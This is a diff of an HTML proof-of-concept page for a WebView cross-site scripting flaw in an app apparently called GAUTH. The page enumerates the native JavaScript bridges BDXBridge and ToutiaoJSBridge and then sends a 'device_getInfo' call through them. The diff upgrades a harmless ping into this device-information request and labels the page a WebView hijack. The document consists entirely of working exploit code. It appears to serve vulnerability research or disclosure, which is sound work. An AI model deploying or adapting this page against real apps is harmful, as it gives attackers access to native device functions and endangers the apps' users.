@@ -1,40 +1,51 @@
 <!doctype html>
 <html>
+  <head>
+    <meta charset="utf-8">
+    <title>GAUTH XSS POC</title>
+  </head>
   <body>
     <h1>GAUTH XSS POC</h1>
-    <p>If you see this inside the app, JS is running in the WebView.</p>
+    <p>If you see this inside the app, this page hijacked the Terms WebView.</p>
+
+    <button onclick="doBridge()">Test native bridge</button>
 
     <script>
       alert("WebView controlled");
 
-      setTimeout(function () {
+      function listBridges() {
         var msg = [];
-
         if (window.BDXBridge) msg.push("BDXBridge");
         if (window.ToutiaoJSBridge) msg.push("ToutiaoJSBridge");
-
         alert("Available bridges: " + (msg.join(", ") || "none"));
+      }
 
-        // Try calling invokeMethod / _invokeMethod with a harmless payload
+      function doBridge() {
         try {
-          var payload = JSON.stringify({
-            func: "ping",
-            params: { from: "gauth-xss-poc" },
-            __msg_type: "call",
-            __callback_id: "9999"
-          });
+          // Typical ToutiaoJSBridge payload structure seen in the wild
+          var payload = {
+            "__callback_id": "0",
+            "__msg_type": "call",
+            "func": "device_getInfo",   // example native func name
+            "params": {}
+          };
 
           if (window.ToutiaoJSBridge && ToutiaoJSBridge.invokeMethod) {
-            ToutiaoJSBridge.invokeMethod(payload);
-            alert("Called ToutiaoJSBridge.invokeMethod(ping)");
+            ToutiaoJSBridge.invokeMethod(JSON.stringify(payload));
+            alert("Sent invokeMethod(device_getInfo)");
           } else if (window.BDXBridge && BDXBridge._invokeMethod) {
-            BDXBridge._invokeMethod(payload);
-            alert("Called BDXBridge._invokeMethod(ping)");
+            BDXBridge._invokeMethod(JSON.stringify(payload));
+            alert("Sent _invokeMethod(device_getInfo)");
+          } else {
+            alert("No bridge methods found");
           }
         } catch (e) {
           alert("Bridge call error: " + e);
         }
-      }, 2000);
+      }
+
+      // Run on load
+      setTimeout(listBridges, 1500);
     </script>
   </body>
 </html>
